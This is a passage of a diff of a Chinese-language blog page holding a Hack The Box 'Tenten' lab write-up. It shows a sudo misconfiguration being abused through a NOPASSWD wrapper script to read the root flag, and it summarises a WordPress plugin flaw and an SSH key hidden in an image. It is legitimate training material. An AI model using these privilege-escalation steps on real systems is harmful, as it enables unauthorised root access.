3771 Apr 12  2017 .bashrc</span><br><span class="line">drwx------ 2 takis takis 4096 Apr 12  2017 .cache</span><br><span class="line">-rw------- 1 root  root   162 Apr 12  2017 .mysql_history</span><br><span class="line">drwxrwxr-x 2 takis takis 4096 Apr 12  2017 .nano</span><br><span class="line">-rw-r--r-- 1 takis takis  655 Apr 12  2017 .profile</span><br><span class="line">drwx------ 2 takis takis 4096 Apr 12  2017 .ssh</span><br><span class="line">-rw-r--r-- 1 takis takis    0 Apr 12  2017 .sudo_as_admin_successful</span><br><span class="line">-r--r--r-- 1 takis takis   33 Apr 12  2017 user.txt</span><br><span class="line">-rw-r--r-- 1 root  root   217 Apr 12  2017 .wget-hsts</span><br></pre></td></tr></table></figure>
+<p>提权就很简单了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">takis@tenten:~$ sudo -l</span><br><span class="line">Matching Defaults entries for takis on tenten:</span><br><span class="line">    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User takis may run the following commands on tenten:</span><br><span class="line">    (ALL : ALL) ALL</span><br><span class="line">    (ALL) NOPASSWD: &#x2F;bin&#x2F;fuckin</span><br><span class="line">takis@tenten:~$ ls -la &#x2F;bin&#x2F;fuckin</span><br><span class="line">-rwxr-xr-x 1 root root 24 Apr 12  2017 &#x2F;bin&#x2F;fuckin</span><br><span class="line">takis@tenten:~$ cat &#x2F;bin&#x2F;fuckin</span><br><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">$1 $2 $3 $4</span><br><span class="line">takis@tenten:~$ sudo &#x2F;bin&#x2F;fuckin cat &#x2F;root&#x2F;root.txt</span><br><span class="line">f9f7[------------------]f603</span><br></pre></td></tr></table></figure>
+<h2 id="0x04-Summary">0x04 Summary</h2>
+<p>Tenten算是一个比较古老的Linux靶机了，就权当开阔知识面，这个靶机的风格和CTF的比赛题很像，通过找wordpress站点的插件漏洞，以及常见的wordpress上传路径来找到隐写<code>id_rsa</code>文件的图片。之后的过程就是比较简单的提权操作了，方法有很多。这个靶机算是比较简单的吧，写了一个小脚本来爆破目录，一天搞定，明天继续。</p>
 
 </div>
 
@@ -545,12 +391,23 @@ function sidebar_toggle() {
     <!-- Author title
     <div class="author-title">
       <div>ca01h</div>
-      <div>2020-09-26</div>
+      <div>2020-03-18</div>
     </div> -->
 	
 	<script src="https://www.hackthebox.eu/badge/212159"></script>
   </div> 
 
+  
+    <div class="divider"></div>
+
+    <div class="link">
+	  <i class="fas fa-folder-open"></i>&nbsp;
+      <a class="category-link" href="/categories/%E9%9D%B6%E6%9C%BA/">靶机</a>-><a class="category-link" href="/categories/%E9%9D%B6%E6%9C%BA/HTB/">HTB</a>
+	  </br>
+	  <i class="fas fa-tags"></i>&nbsp;
+      <a class="tag-none-link" href="/tags/%E9%9D%B6%E6%9C%BA/" rel="tag">#靶机</a>
+    </div>
+    
   
 
   <div class="divider"></div>
